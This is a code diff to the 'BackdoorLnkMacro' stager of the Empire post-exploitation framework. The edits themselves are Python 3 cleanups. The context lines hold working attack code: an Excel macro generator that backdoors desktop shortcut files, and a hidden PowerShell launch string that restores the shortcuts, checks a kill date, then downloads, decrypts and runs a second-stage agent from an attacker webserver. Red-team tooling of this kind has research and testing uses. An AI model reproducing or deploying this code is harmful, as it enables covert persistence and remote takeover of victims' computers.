@@ -1,10 +1,7 @@
-from __future__ import print_function
-
 import datetime
 import logging
 import random
 import string
-from builtins import chr, object, range, str
 
 import xlrd
 from Crypto.Cipher import AES
@@ -16,8 +13,8 @@ from empire.server.common import helpers
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "BackdoorLnkMacro",
             "Authors": [
@@ -134,7 +131,7 @@ class Stager(object):
                 "Value": "0",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, "
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, "
                 "or other) (2nd stage).",
                 "Required": False,
                 "Value": "default",
@@ -147,11 +144,6 @@ class Stager(object):
         }
 
         self.mainMenu = mainMenu
-
-        for param in params:
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
 
     # function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
     @staticmethod
@@ -295,7 +287,7 @@ class Stager(object):
                 reader = xlrd.open_workbook(xls_out)
                 work_book = copy(reader)
                 active_sheet = work_book.get_sheet(0)
-            except (IOError, OSError):
+            except OSError:
                 work_book = Workbook()
                 active_sheet = work_book.add_sheet("Sheet1")
 
@@ -361,7 +353,7 @@ class Stager(object):
             input_col = input_col + random.randint(1, 4)
 
             macro += "If("
-            for i, item in enumerate(target_exe):
+            for i, _item in enumerate(target_exe):
                 if i:
                     macro += " or "
                 active_sheet.write(
@@ -378,7 +370,7 @@ class Stager(object):
             macro += ") Then\n"
             # launchString contains the code that will get insterted into the backdoored .lnk files, it will first launch the original target exe, then clean up all backdoors on the desktop.  After cleanup is completed it will check the current date, if it is prior to the killdate the second stage will then be downloaded from the webserver selected during macro generation, and then decrypted using the key and iv created during this same process.  This code is then executed to gain a full agent on the remote system.
             launch_string1 = "hidden -nop -c \"Start('"
-            launch_string2 = ");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like'*xml.xmldocument*'){$s=$l.arguments.IndexOf('''')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf('''',$s)-$s);$l.targetPath=$r;$l.Arguments='';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
+            launch_string2 = r");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like'*xml.xmldocument*'){$s=$l.arguments.IndexOf('''')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf('''',$s)-$s);$l.targetPath=$r;$l.Arguments='';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
             launch_string3 = (
                 ") -le "
                 + str(kill_date[2])
@@ -457,7 +449,7 @@ class Stager(object):
             )
 
             # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
-            iv_buf = ("").encode("UTF-8")
+            iv_buf = b""
             for z in range(0, 16):
                 iv = enc_iv + z
                 iv = iv.to_bytes(1, byteorder="big")
